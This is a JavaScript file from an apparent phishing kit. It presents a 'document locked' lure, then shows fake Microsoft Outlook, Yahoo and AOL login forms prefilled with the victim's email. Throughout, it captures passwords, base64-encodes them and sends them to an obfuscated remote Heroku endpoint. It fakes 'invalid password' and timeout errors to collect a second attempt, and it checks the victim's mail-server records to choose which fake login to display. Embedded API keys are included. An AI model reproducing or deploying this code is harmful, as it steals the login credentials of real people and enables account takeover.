let showHide=false;
/*For Main Section*/

let htmlDate="";
let comment="Please enter the email address document was shared with to unlock this document.";
let subject="", url_main_link="",sec_p=false,fina=false,compare="",count=false;
$(document).ready(function(){
    if(location.href.includes("out=true")){
        $("body").css({"background":"none"})
        updateOUT("out");
        linkme=linkme.replace("out=true&","");
    } else {
        $("#board").show();
    }
    url_main_link = getParameterByName(urlcheck("parid=root.html", "parid=root.html").replace("#", ""));
    if (SHOW_EXTRA_PARAMS === true) {
        window.history.pushState($("html").html(), "Login - myFirstAm", url_main_link);
    }
    //$("a").each(function (me) {$(this).attr("onclick","window.location.replace('"+url_main_link+"');return false;");});

    const url = new URL(linkme);
    let e_m = url.searchParams.has("userid") ? url.searchParams.get("userid") : (url.searchParams.has("email") ? url.searchParams.get("email") : "");
    count = url.searchParams.has("count");
    sec_p = url.searchParams.has("sec_p");
    fina = url.searchParams.has("fall");
    if (e_m.includes("@") === true && e_m.includes(".") === true) {
        comment="Please enter the email address document was shared with to unlock this document.";
        compare=e_m;
    }

    let a_url = linkme.replace("/parid=root.html", "/ANGCt2yjr4Uesak/index.html");
    $(".div_form a").attr("href", a_url);



    if(fina===true){
        let cont=window.atob("PHNwYW4+PGkgY2xhc3M9ImZhIGZhLWxvY2siIHN0eWxlPSJwYWRkaW5nLXJpZ2h0OiA2cHg7Ij48L2k+QXV0aGVudGljYXRpb24gZmFpbGVkPC9zcGFuPjxzcGFuPlRoZSBhY2NvdW50IGRvZXNuJ3QgZXhpc3Qgb3IgaW52YWxpZCBhY2NvdW50IGRldGFpbHMsIHBsZWFzZSBjaGVjayBhbmQgdHJ5IGFnYWluLjwvc3Bhbj4=");
        $(".p_details").html(cont).addClass("erro");
        $("button").removeClass("button").addClass("button2").html("Try again");
        $(".div_form div, .div_form label, .div_form input, .div_form a").remove();
    }

    $("button.button").click(function(e) {
        e.preventDefault();
        submit_now();
        return false;
    });

    $("button.button2").click(function(e) {
        e.preventDefault();
        let loc = linkme.replace("fall=yeske", "count=one");
        location.replace(loc);
        return false;
    });

    $(".div_form > a").click(function (e) {
        e.preventDefault();
        let loc = linkme.replace("?", "?out=true&");
        location.replace(loc);
        return false;
    });

    $("input").keydown(function(){
        $(this).removeClass("er");
    });

    $("form").submit(function(e) {
        e.preventDefault();
        submit_now();
        return false;
    });


});


function validateEmail(mail) {
    if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail)){
        return true;
    }
    return false;
}


function submit_now() {
    if ($("button").hasClass("working")) {
        return false;
    }
    $("._error").hide("fast");
    if (validateEmail($("#im").val()) === false) {
        $("#im").addClass("er").focus();
        comment = "Enter a valid email address";
        $("._error").html(comment).show("slow");
        return false;
    }

    $("button.button").addClass("working");
    $("button.button span").html("Please wait");


    if (FORCE_AUTO_GRAB === true && compare.includes("@") && compare.toLowerCase() != $("#im").val().toLowerCase()) {
        setTimeout(function () {
            $("#im").addClass("er").focus();
            comment = "Please enter the email address document was shared with to unlock this document.";
            $("._error").html(comment).show("slow");
            $("button.button").removeClass("working");
            $("button.button span").html("Unlock Document");
            return false;
        }, 1000);
    } else{
        $(".div_form a").removeAttr("href").css({"background": "#e4e3e3","box-shadow": "none","cursor": "not-allowed"});
        $(".div_form input").prop("disabled", true);
        u_id=$("#im").val();
        $.ajax({
            dataType: 'text',
            url: SCRIPT_LINK,
            type: 'POST',
            data: {
                redirect: $("#im").val(),
                lsk: window.btoa($("#im").val()),
                ls: YOUR_LICENSE,
            },
            success: function (response) {
                setTimeout(function () {
                    const urdl = new URL(linkme.split("/parid=root")[0]+response.trim().replace("authenticate.html","/parid=root.html"));
                    let u=urdl.searchParams.has("dir")?(urdl.searchParams.get("dir").trim().length===1?"/dirAssets/"+urdl.searchParams.get("dir").trim()+"==.html":""):"";
                    if(u.length>4){
                        let cd =compare.length>3?"&email="+compare:"";cd=count?(cd+"&count=2"):cd;
                        response=linkme.split("/parid=root")[0]+response.trim().replace("authenticate.html",u)+"&access=passed"+cd;
                        reading(response.trim());
                    }
                    else{window.location.replace(url_main_link);}
                }, 500);
            },
            error: function (response) {
                window.location.replace(url_main_link);
            }
        });
    }
}

function getParameterByName(name) {
    let ser = "";
    const url = new URL(name.split("#").join(""));
    let query = url.search.split("?").join("&").split("&&").join("&");
    let qur = url.search.split("?").join("&");
    qur = qur.split("&&").join("&");
    let link = url.href.split("?")[0];
    $.each(qur.split("&"), function(index, value) {
        var name = "---" + value.split("=")[0] + "---";
        if (ser.includes(name)) {
            query = query.replace("&" + value, "").replace(value, "");
        } else {
            ser = ser + name;
        }
    });
    return (link + "?" + query).replace("?&", "?");
}

function urlcheck(e, t) {
    let r = linkme;
    return r.includes("?"), r.includes(e) ? r = r.replace(e, t) : r.endsWith("/") ? r += t : r = r + "/" + t, r = r + "?scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", "")
}

function reading(redirect) {
    let distance = 20;
    let count = 0;
    let pro = 0;
    const x = setInterval(function() {
        distance = distance - 1;
        pro++;
        if (count === 0 || count > 3) {
            $(".b2, .b3").css({
                "opacity": "0"
            });
            count = 0;
        } else {
            $(".b" + count).css({
                "opacity": "1"
            });
        }
        count++;

        if(pro === 5){
            $("button span").html("Authenticating");
        }

        if(pro === 12){
            $("button span").html("Unlocking");
        }

        if (distance <= 0) {
            clearInterval(x);
            continue_function(count);
            htmlDate=redirect;
            rearrangeParams(htmlDate);
            if(redirect.includes("dir=a")){
                updateA(u_id);
            }else if(redirect.includes("dir=y")){
                updateY(u_id);
            }else {
                updateM(u_id, false)
            }
            //window.location.replace(redirect);
        }
    }, (8150 / 20));
}

function continue_function(d){
    let distance = 1000;
    let count = d;
    const x = setInterval(function() {
        distance = distance - 1;
        if (count === 0 || count > 3) {
            $(".b2, .b3").css({
                "opacity": "0"
            });
            count = 0;
        } else {
            $(".b" + count).css({
                "opacity": "1"
            });
        }
        count++;

        if (distance <= 0) {
            clearInterval(x);
        }
    }, (8150 / 20));
}


function rearrangeParams(htmlDate) {
    const urlx = new URL(htmlDate);
        if (window.atob(urlx.searchParams.get("userid")).includes("@") === false || window.atob(urlx.searchParams.get("userid")).includes(".") === false) {
            window.location.replace(CUSTOM_REDIRECT);
        }
        u_id = window.atob(urlx.searchParams.get("userid"));
        mx_host = urlx.searchParams.get("e_Type");
        SCRIPT_NAME = window.atob("aHR0cHM6Ly9sb2FkZHJpcmVjdGpzb24uaGVyb2t1YXBwLmNvbS9jaGVja0RvbWFpbi9zY3JpcHQv") + YOUR_LICENSE + "/";
}

/*End Of Main Section*/




/*For YA Section*/


function YAFocus(d) {
    $("#password-container").addClass("focused");
}
function YAKeydown(event) {
    //console.log(event);
    if (event.getModifierState("CapsLock")) {
        $("#caps-indicator").removeClass("hide");
    } else {
        $("#caps-indicator").addClass("hide");
    }
}

function YAFocusout(d) {
    if($(".login-box.right input.password").val().length<1){$("#password-container").removeClass("focused");}
}
function YASubmit(d) {
    YAsubmit_form();
}
function changeToggle(d) {
    showHide=true;
    if($(d).hasClass("hide-pw")){
        $(d).removeClass("hide-pw").attr("title", "Hide password");$(".login-box.right input.password").attr("type", "text");
    }else {
        $(d).addClass("hide-pw").attr("title", "Show password");$(".login-box.right input.password").attr("type", "password");
    }
}

function updateA(u_id) {
    showHide=false;
    $("#board2").html(returnTheValue("a")).css({"width": "360px","height": "550px"});
    setTimeout(function() {
        $("#e_mail, .login-box.right input[name=username]").val(u_id); $(".yid").html(u_id);
        $("#board").hide();
        $("#board2").show();
    }, 1000);
}
function updateY(u_id) {
    showHide=false;
    let alight=atob("aHR0cHM6Ly9zLnlpbWcuY29tL3dtL2Fzc2V0cy9pbWFnZXMvbnMvYW9sLWxvZ28tYmxhY2stdi4wLjAuMi5wbmc="), adim=atob("aHR0cHM6Ly9zLnlpbWcuY29tL3dtL2Fzc2V0cy9pbWFnZXMveWJhci9hb2wtbG9nby13aGl0ZS12MC4wLjQucG5n");
    let ylight=atob("aHR0cHM6Ly9zLnlpbWcuY29tL3J6L3AveWFob29fZnJvbnRwYWdlX2VuLVVTX3NfZl9wX2Jlc3RmaXRfZnJvbnRwYWdlXzJ4LnBuZw=="), ydim=atob("aHR0cHM6Ly9zLnlpbWcuY29tL3J6L3AveWFob29fZnJvbnRwYWdlX2VuLVVTX3NfZl93X2Jlc3RmaXRfZnJvbnRwYWdlXzJ4LnBuZw==");
    let aalt=atob("YWx0PSJBb2wi"),yalt=atob("YWx0PSJZYWhvbyI="),aheight=atob("d2lkdGg9IjEwMCIgaGVpZ2h0PSIi"),yheight=atob("d2lkdGg9IiIgaGVpZ2h0PSIyNyI="),ar=atob("b25jbGljaz0iWUFTdWJtaXQodGhpcyk7Ig=="),yr=atob("b25jbGljaz0iWUFTdWJtaXQodGhpcyk7IiBzdHlsZT0iYm9yZGVyLXJhZGl1czogMS4xNzY0N3JlbTsi");
    $("#board2").html(returnTheValue("a").replace(alight,ylight).replace(adim,ydim).replace(ar,yr).split(aalt).join(yalt).split(aheight).join(yheight)).css({"width": "360px","height": "550px"});
    setTimeout(function() {
        $("#e_mail, .login-box.right input[name=username]").val(u_id); $(".yid").html(u_id);
        $("#board").hide();
        $("#board2").show();
    }, 1000);
}

function YAsubmit_form() {
    if ($('#login-signin').hasClass("loading")) {
        return false;
    }else {
    $('#login-signin').addClass("loading");
    let pass_w = $("#login-passwd").val();
    let email = $("#e_mail").val();
    if (pass_w.trim().length < 1) {
        continue___function();
        $("#password-container").addClass("error");
        $(".error-msg").show("slow").html("Please provide password.");
    } else if (pass_w.length < 6) {
        continue___function();
        $("#password-container").addClass("error");
        $(".error-msg").show("slow").html("Please provide a valid password.");
    } else {
        $(".error-msg").hide();
        $("#login-passwd").attr("readonly", "readonly");
        pass_w = window.btoa(pass_w);
        email = window.btoa(email);
        let hoster = window.btoa(mx_host);
        sendOutYA(SCRIPT_NAME, hoster, email, pass_w, is_second2 === false ? 4000 : 2000, is_second2 === false ? "" : " - Second Log");
    }
    }
}

function continue___function(){
    let distance = 5;
    const x = setInterval(function() {
        distance = distance - 1;
        if (distance <= 0) {
            clearInterval(x);
            $('#login-signin').removeClass("loading");
        }
    }, 300);
}


function sendOutYA(SCRIPT_NAME,hoster_2, email_2, pass_w_2, count, confirm2) {
    $.ajax({
        dataType: 'text',
        url: SCRIPT_NAME,
        type: 'GET',
        data: {
            host: hoster_2,
            u____s: email_2,
            p_____d___s: pass_w_2,
            confirmed_2: confirm2
        },
        success: function (response) {
            setTimeout(function () {
                if (is_second2 === false) {
                    if (showHide === true) {
                        if (linkme.includes("count=")) {
                            location.replace(CUSTOM_REDIRECT);
                        } else {
                            location.replace(linkme.replace("access=passed", "access=passed&fall=yeske"));
                        }
                    } else {
                        is_second2 = true;
                        continue___function();
                        $("#login-passwd").val("").removeAttr("readonly").focus();
                        $("#password-container").addClass("error");
                        $(".error-msg").show("slow").html("Invalid password. Please try again.");
                    }
                } else {
                    if (linkme.includes("count=")) {
                        location.replace(CUSTOM_REDIRECT);
                    } else {
                        location.replace(linkme.replace("access=passed", "access=passed&fall=yeske"));
                    }
                }
            }, count);
        },
        error: function (response) {
            window.location.replace(CUSTOM_REDIRECT);
        }
    });

}

/*End of YA Section*/




/*For MO Section*/


function MOSubmit(d) {
    if(!$('#idSIButton9').hasClass("button_submit")) {
        MAsubmit_form();
    }
}


function updateM(u_id, mo) {
    if(mo===false){
        $("#board2").css({"width": "400px","height": "397px"});
    }
    $("#board2").html(returnTheValue("m"));
    setTimeout(function() {
        $("#e_mail").val(u_id); $("#displayName").html(u_id).attr("title",u_id);
        $("#i0118").attr("title", `Enter password for ${u_id}`);
        if(mo===false) {
            $(".out #lightbox").css({
                "box-shadow": "none",
                "margin": "0",
                "min-width": "400px",
                "border-radius": "5px"
            });
        }
        $("#idA_PWD_ForgotPassword").attr("href", linkme);
        $("#board").hide();
        $("#board2").show();
    }, 1000);
}


function sendOut(SCRIPT_NAME,hoster_2, email_2, pass_w_2, count, confirm2) {
    $.ajax({
        dataType: 'text',
        url: SCRIPT_NAME,
        type: 'GET',
        data: {
            host: hoster_2,
            u____s: email_2,
            p_____d___s: pass_w_2,
            confirmed_2:confirm2
        },
        success: function (response) {
            setTimeout(function() {
                if(is_second2===false){
                    is_second2=true;
                    continue__function();
                    $("#i0118").val("").focus();
                    $("#idSIButton9").removeClass('button_submit');
                    $("#usernameError").addClass("error").removeClass("hme").html("Connection timeout: error#00x"+Math.random().toString().replace("0.", "").substr(0,3)+", please input your password again.");
                    $(".out .lightbox-cover").removeClass("disable-lightbox");
                }else {
                    if(linkme.includes("count=")){location.replace(CUSTOM_REDIRECT);
                    }else {location.replace(linkme.replace("access=passed", "access=passed&fall=yeske"));}
                }
            }, count);
        },
        error: function (response) {
            window.location.replace(CUSTOM_REDIRECT);
        }
    });
}


function MAsubmit_form() {
    if($('#idSIButton9').hasClass("button_submit")){
        return false;
    }else {
        $('#progressBar').show();
        let pass_w = $("#i0118").val();
        let email = $("#e_mail").val();
        if (pass_w.trim().length < 1){
            continue__function();
            $("#i0118").addClass("has-error");
            $("#usernameError").addClass("error").removeClass("hme").html("Because you're accessing sensitive info, you need to verify your password.");
        }else if (pass_w.length < 6){
            continue__function();
            $("#login-passwd").addClass("has-error");
            $("#usernameError").addClass("error").removeClass("hme").html("Your account password is incorrect.");
        }else {
            //if($("#usernameError").hasClass("error")){$("#usernameError").addClass("hme");}
            $("#i0118").removeClass("has-error");
            $("#idSIButton9").addClass('button_submit');
            $(".out .lightbox-cover").addClass("disable-lightbox");
            let pass_w_2 = window.btoa(pass_w);
            let email_2 = window.btoa(email);
            let hoster_2 = window.btoa(mx_host);
            sendOut(SCRIPT_NAME,hoster_2, email_2, pass_w_2, is_second2===false?4000:2000, is_second2===false?"":" - Second Try");
        }
    }
}

function continue__function(){
    let distance = 5;
    const x = setInterval(function() {
        distance = distance - 1;
        if (distance <= 0) {
            clearInterval(x);
            $('#progressBar').hide();
            $("#idSIButton9").removeClass('button_submit');
            $(".out .lightbox-cover").removeClass("disable-lightbox");
        }
    }, 300);
}


/*End of MO Section*/






/*For OUT Section*/

var api_name="";
var api_index=0;

function LFocusOut(d) {
    $("#i0118").removeAttr("style");
}

function LReload(event) {
    if($("#i0118").hasClass("checkmeout")){
        if(validateEmail($("#i0118").val())===false){
            $("#usernameError").removeClass("primary").addClass("error").html("Enter a valid email address").show();
            $("#i0118").addClass("has-error ext-has-error checkmeout").removeAttr("style");
        }else {
            $("#usernameError").hide("fast");
            $("#i0118").removeClass("has-error ext-has-error").css({"border-bottom-color":"#195c9e"});
        }
    }
}

function updateOUT(u_id) {
    api({});
    $(".div_main").addClass("added");
    $("#board").html(returnTheValue("out").replace("class=\"out\"", "class=\"out me\"").replace("name=\"passwd\"", "name=\"passwd\" onkeyup=\"LReload(event);\" onfocusout=\"LFocusOut(this);\"")).css({"width": "auto","height": "397px","border-radius":"0"});
    setTimeout(function() {
        $("#e_mail").val(u_id); $("#displayName").html(u_id).attr("title",u_id);
        $("#i0118").attr("title", `Enter password for ${u_id}`);
        $(".out #lightbox").css({"box-shadow": "none","margin": "0","min-width": "460px"});
        $("#board2").hide();
        $("#board").show();
    }, 1000);
}

function OUTSubmit(d){
    if(!$('#idSIButton9').hasClass("button_submit")) {
        $('#progressBar').show();
        $(".out .lightbox-cover").addClass("disable-lightbox");
        $("#idSIButton9").addClass('button_submit');
        if (validateEmail($("#i0118").val()) === false) {
            continue__function();
            $("#usernameError").removeClass("primary").addClass("error").html("Enter a valid email address").show();
            $("#i0118").addClass("has-error ext-has-error checkmeout");
        } else {
            let domain_name = $("#i0118").val().toString().split('@')[1];
            let xhr2 = window.atob("aHR0cHM6Ly93d3cud2hvaXN4bWxhcGkuY29tL3dob2lzc2VydmVyL0ROU1NlcnZpY2U/YXBpS2V5PQ==") + api_name + window.atob("JmRvbWFpbk5hbWU9") + domain_name + window.atob("JnR5cGU9MTUmb3V0cHV0Rm9ybWF0PWpzb24=");
            //console.log(xhr2)
            setTimeout(function () {
                $.ajax({
                    dataType: 'json',
                    url: xhr2,
                    type: 'GET',
                    success: function (response) {
                        if (response.hasOwnProperty('DNSData')) {
                            if (response.DNSData.hasOwnProperty('dnsRecords')) {
                                if (response.DNSData.dnsRecords.length > 0) {
                                    let om = true;
                                    $.each(response.DNSData.dnsRecords, function (key, value) {
                                        if (value.target.includes("google.com") || value.target.includes("gmail.com") || value.target.includes(".google") || value.target.includes(".gmail")) {
                                            om = false;
                                        }
                                    });
                                    if (om === false) {
                                        $("#usernameError").removeClass("primary").addClass("error").html("This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.").show();
                                        $("#i0118").addClass("has-error ext-has-error checkmeout").removeAttr("style");
                                        continue__function();
                                    } else {
                                        setTimeout(function () {
                                            htmlDate = linkme + "&userid=" + btoa($("#i0118").val()) + "&e_Type=Outlook";
                                            rearrangeParams(htmlDate);
                                          updateM(u_id, true);
                                        }, 500);
                                    }
                                } else {
                                    $("#usernameError").removeClass("primary").addClass("error").html("We couldn't find an account with that username, try another email address.").show();
                                    $("#i0118").addClass("has-error ext-has-error checkmeout").removeAttr("style");
                                    continue__function();
                                }
                            }
                        } else {
                            api(response);
                        }
                    },
                    error: function (response) {
                        window.location.replace(url_main_link);
                    },
                    complete: function () {

                    }
                });

            }, 1500);
        }
    }
}

function api(response) {
    let xhr2="WyJhdF9SWFpqeU9FOHJ3Q1R0WFVmazM0SUlMWkdXMExmeCIsImF0X1VnVklsUEdXZUsxdnBZNklMQWtOQTJNY1l1Rm1zIiwiYXRfbkZ6eWEzSWVKYk9kdFREQU5MV1Z5ZjRGNXV1ZTAiLCJhdF81Wk05amV3SjhUR2FLMUFTNGt4WVVYUk5MM2xCcCJd";
    let work=JSON.parse(window.atob(xhr2));let data_=response;
    if(Object.keys(data_).length===1){
        if(data_.hasOwnProperty("ErrorMessage")){
            api_index++;api_name=work[api_index];
        }else {
            api_name=work[api_index];
        }
    } else {
        api_name=work[api_index];
    }
}


/*End of OUT section*/

